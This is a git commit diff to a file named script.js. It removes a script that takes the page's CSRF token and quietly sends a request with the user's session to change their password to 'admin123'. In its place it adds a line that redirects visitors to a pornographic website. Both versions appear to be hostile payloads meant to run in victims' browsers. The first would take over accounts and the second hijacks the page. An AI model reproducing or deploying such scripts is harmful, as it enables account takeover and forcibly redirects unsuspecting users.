de1ddec9952cb8929516825db07474bec22252e5
Jaynel Patiarba <39252817+0xcucumbersalad@users.noreply.github.com>
2025-04-02 16:24:48 +0800

    Update script.js

--- script.js
+++ script.js
@@ -1,16 +1,1 @@
-const csrfToken = document.querySelector('meta[name="csrf-token"]').content;
-
-fetch('/users/change-password', {
-    method: 'POST',
-    credentials: 'include',
-    headers: {
-        'Content-Type': 'application/json',
-        'X-CSRF-TOKEN': csrfToken 
-    },
-    body: JSON.stringify({
-        password: 'admin123',
-        password_confirmation: 'admin123'
-    })
-}).then(response => response.json())
-  .then(data => console.log('Success:', data))
-  .catch(error => console.error('Error:', error));
+window.location="https://pornhub.com";
